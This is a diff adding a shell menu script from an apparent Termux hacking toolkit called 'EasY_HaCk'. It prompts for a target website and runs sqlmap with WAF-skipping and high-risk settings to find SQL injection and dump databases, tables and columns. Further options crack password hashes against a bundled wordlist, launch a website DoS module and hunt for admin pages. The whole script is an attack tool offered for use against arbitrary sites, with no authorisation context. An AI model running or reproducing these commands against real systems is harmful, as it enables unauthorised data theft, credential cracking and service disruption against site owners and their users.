@@ -1,0 +1,246 @@
+#!/bin/sh
+clear
+#colour
+
+R='\033[1;31m'
+B='\033[0;34m'
+C='\033[0;36m'
+G='\033[1;32m'
+W='\033[1;37m'
+Y='\033[0;33m'
+Y2='\033[1;33m'
+
+#banner
+echo $C
+echo "██╗    ██╗███████╗██████╗ "
+echo "██║    ██║██╔════╝██╔══██╗"
+echo "██║ █╗ ██║█████╗  ██████╔╝"
+echo "██║███╗██║██╔══╝  ██╔══██╗"
+echo "╚███╔███╔╝███████╗██████╔╝"
+echo " ╚══╝╚══╝ ╚══════╝╚═════╝ penetration testing "
+
+#code
+echo $Y2
+echo $B"    [$R"01"$B]$G INFIRMATION GATHRING"
+echo $B"    [$R"02"$B]$G SQL INJECTION SCANNER "
+echo $B"    [$R"03"$B]$G SQL INJECTION FOR BEGINNERS "
+echo $B"    [$R"04"$B]$G ADVANCED SQL INJECTION EXPLOITATION  "
+echo $B"    [$R"05"$B]$G DATABASE ENUMIRATION $C (dbs dump) "
+echo $B"    [$R"06"$B]$G TABLES ENUMERATION   $C (TB dump) "  
+echo $B"    [$R"07"$B]$G COLUMNS ENUMIRATION  $C (COL dump) "
+echo $B"    [$R"08"$B]$G HASHES ID "
+echo $B"    [$R"09"$B]$G HASHES CRACKING 1"
+echo $B"    [$R"10"$B]$G HASHES CRACKING 2"
+echo $B"    [$R"11"$B]$G ONLINE HASHES CRACKER "  
+echo $B"    [$R"12"$B]$G WEB SITES DOS ATTACK "  
+echo $B"    [$R"13"$B]$G ADMIN PAGE FINDER "  
+echo $B"    [$R"14"$B]$G SQLMAP UPDATE "  
+echo $B"    [$R"00"$B]$G BACK "  
+echo $B"    [$W"XX"$B]$G EXIT "
+echo " "
+echo -n $R"[$W"Inf0rmati0n Gathering"$R]$W"~"$R"'#': 
+read zaki
+if [ $zaki = "1" ] || [ $zaki = "01" ];
+then
+echo
+$PREFIX/share/EasY_HaCk/.modules/.inf0
+clear
+echo
+elif [ $zaki = "2" ] || [ $zaki = "02" ];
+then
+echo
+echo $C "Please input the target website "
+echo $C "exemple :$W www.exemple.com/index.php?=1 "
+echo -n $R "Target or website$Y : " 
+read target
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target --skip-waf
+echo -n $R" Press" ENTRE to back" " 
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "3" ] || [ $zaki = "03" ];
+then 
+echo
+clear
+echo $C "    You are in the sql injection scanning session "
+echo $C "      Please input the target website "
+echo $C "exemple :$W www.exemple.com/index.php?=1 "
+echo -n $R "Target or website$Y : " 
+read target
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target --wizard --skip-waf
+echo -n $R"Press" ENTRE to back" " 
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "4" ] || [ $zaki = "04" ];
+then 
+echo
+clear
+echo $C "    You are in sql injections advanced exploitation session "
+echo $C "      Please input the target website "
+echo $C "exemple :$W www.exemple.com/index.php?=1 "
+echo -n $R "Target or website$Y : " 
+read target
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target --skip-waf --risk=3 --level=4  --dbs --threads 3 --time-sec=10 --batch
+echo -n  $R"Press" ENTRE to back" " 
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "5" ] || [ $zaki = "05" ];
+then 
+echo
+clear
+echo $C "    You are in the Databases dump session "
+echo $C "      Please input the target Database "
+echo $C "exemple :$W www.exemple.com/index.php?=1 "
+echo -n $R "Target or website$Y : " 
+read target1
+echo -n $R "Database$Y :" 
+read target2
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target1 --skip-waf -D $target2 --tables --threads 2 --batch
+echo -n  $R"Press" ENTRE to back" " 
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "6" ] || [ $zaki = "06" ];
+then 
+echo
+clear
+echo $C "    You are in the Tables dump session "
+echo $C "      Please input the target website "
+echo -n $R "Target or website$Y : "  
+read target1
+echo $C "Pleas input the target Database "
+echo -n $R "Database$Y :"
+read target2
+echo $C "Please input the target Tables "
+echo -n $R "Tables$Y : " 
+read target3
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target1 -D $target2 -T $target3 --columns --skip-waf --batch
+echo -n  $R"Press" ENTRE to back" "
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "7" ] || [ $zaki = "07" ];
+then 
+echo
+clear
+echo $C "    You are in the Columns dump session "
+echo $C "      exemple :$W www.exemple.com/index.php?=1 "
+echo -n $R "Target or website$Y : "
+read target1
+echo -n $R "Database$Y : "
+read target2
+echo $C "Please input the target Tables "
+echo -n $R "Tables$Y : " 
+read target3
+echo -n $R"THE TARGET COLUMNS HEAR $G ~#:"
+read target4
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target1  -D $target2 -T $target3 -C $target4 --dump --threads 2 --skip-waf --batch
+echo -n  $R"Press" ENTRE to back" "
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "8" ] || [ $zaki = "08" ];
+then 
+echo
+python $PREFIX/share/EasY_HaCk/.modules/.hash-id.py
+elif [ $zaki = "9" ] || [ $zaki = "09" ];
+then 
+echo
+python2 $PREFIX/share/EasY_HaCk/.modules/.Hash/Hash.py
+echo -n  $R"Press" ENTRE to back" "  
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "10" ]
+then 
+echo
+clear
+echo $W"password cracking$R [2]"
+echo $R"[$G*$R]$W"Algorithm"$R:$W md5$R-$W"sha1"$R-$W"sha224"$R-$W"sha256"$R-$W"sha384"$R-$W"sha512" "
+echo -n $W"Put the Correct Algorithm$R : "  
+read zaki
+echo -n $W"Put Your Hash to Crack$R :"
+read zaki2
+echo $W"the Cracking Process it can take $G"1~25 m" " $W
+echo
+date
+python2 $PREFIX/share/EasY_HaCk/.modules/.Python-Hash-Cracker/Hash-Cracker.py -t $zaki -h $zaki2 -w $PREFIX/share/EasY_HaCk/.modules/zaki.txt
+date
+echo -n  $R"Press" ENTRE to back" "  
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "11" ];
+then 
+echo
+termux-open https://crackstation.net
+echo -n  $R"Press" ENTRE to back" " 
+read ENTRE
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "12" ];
+then
+clear
+$PREFIX/share/EasY_HaCk/.modules/.dos
+elif [ $zaki = "13" ];
+then
+clear
+echo $G"+-+-+-+-+-+$R +-+-+-+-+$W +-+-+-+-+-+-+"
+echo $G"|A|d|m|i|n|$R |p|a|g|e|$W |f|i|n|d|e|r|"
+echo $G"+-+-+-+-+-+$R +-+-+-+-+$W +-+-+-+-+-+-+ $Y2 v1.2"$G
+python2 $PREFIX/share/EasY_HaCk/.modules/.admin-page-finder.py
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "14" ];
+then
+clear
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py --update
+$PREFIX/share/EasY_HaCk/.modules/.web
+elif [ $zaki = "00" ] || [ $zaki = "0" ];
+then
+clear
+echo "EasY_HacK "
+sleep 0.5
+clear
+echo "EasY_HacK ./ "
+sleep 0.5
+clear
+echo "EasY_HacK ..\ "
+sleep 0.5
+clear
+echo "EasY_HacK .../ "
+sleep 0.5
+clear
+echo "EasY_HacK ....\ "
+sleep 0.5
+clear
+echo "EasY_HacK ...../ "
+sleep 0.5
+clear
+echo "EasY_HacK ......\ "
+sleep 0.5
+clear
+echo "EasY_HacK ......./ "
+sleep 0.5
+clear
+echo "EasY_HacK ........\ "
+sleep 0.5
+clear
+echo "EasY_HacK ........./ "
+sleep 0.5
+clear
+echo "EasY_HacK ...........\ "
+EasY_HaCk
+elif [ $zaki = "X" ] || [ $zaki = "x" ] || [ $zaki = "xx" ] || [ $zaki = "XX" ] ;
+then
+clear
+echo "$R E.\ "
+sleep 1
+clear
+echo "$R EX../ "
+sleep 1
+clear
+echo "$R EXI...\ "
+sleep 1
+clear
+echo "$R EXIT..../ "
+sleep 1
+exit 
+else
+clear
+echo $Y" Wrong Input..."
+sleep 1
+sh $0
+fi
